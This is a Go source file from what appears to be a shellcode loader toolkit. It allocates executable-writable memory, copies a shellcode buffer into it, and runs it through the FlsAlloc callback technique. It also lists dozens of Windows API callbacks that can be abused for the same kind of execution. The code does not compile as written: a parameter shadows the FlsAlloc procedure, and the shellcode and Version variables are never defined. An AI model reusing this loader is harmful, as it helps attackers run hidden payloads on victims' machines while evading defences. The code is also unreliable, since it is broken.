package Loaders

import (
	"syscall"
	"unsafe"
)

var (
	if1 [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	GetCurrentProcess = kernel32.MustFindProc("GetCurrentProcess")
	FlsAlloc          = kernel32.MustFindProc("FlsAlloc")
	FlsSetValue       = kernel32.MustFindProc("FlsSetValue")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(FlsAlloc []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	dIndex, _, _ := FlsAlloc.Call(addr)
	dummy, _ := syscall.UTF16PtrFromString("dummy")
	FlsSetValue.Call(dIndex, (uintptr)(unsafe.Pointer(dummy)))
}
func CallBackFunc() []string {
	fruits := []string{"CertEnumSystemStore", "CertEnumSystemStoreLocation", "CopyFile2", "CopyFileEx", "CreateThreadPoolWait", "CreateTimerQueueTimer_Tech", "CryptEnumOIDInfo", "EnumCalendarInfo", "EnumCalendarInfoEX", "EnumChildWindows", "EnumDesktopW", "EnumDesktopWindows", "EnumDirTreeW", "EnumDisplayMonitors", "EnumerateLoadedModules", "EnumFontFamiliesExW", "EnumFontFamiliesW", "EnumFontsW", "EnumICMProfiles", "EnumLanguageGroupLocalesW", "EnumObjects", "EnumPageFilesW", "EnumPropsEx", "EnumPropsW", "EnumPwrSchemes", "EnumResourceTypesExW", "EnumResourceTypesW", "EnumSystemLocales", "EnumThreadWindows", "EnumTimeFormatsEx", "EnumUILanguagesW", "EnumWindows", "EnumWindowStationsW", "FiberContextEdit", "FlsAlloc", "ImageGetDigestStream", "ImmEnumInputContext", "InitOnceExecuteOnce", "LdrEnumerateLoadedModules", "LdrpCallInitRoutine", "RtlUserFiberStart", "SetTimer", "SetupCommitFileQueueW", "SymEnumProcesses", "SymFindFileInPath", "SysEnumSourceFiles"}
  return fruits
}
func VersionFunc() string {
  Version = "1.0"
	return Version
}
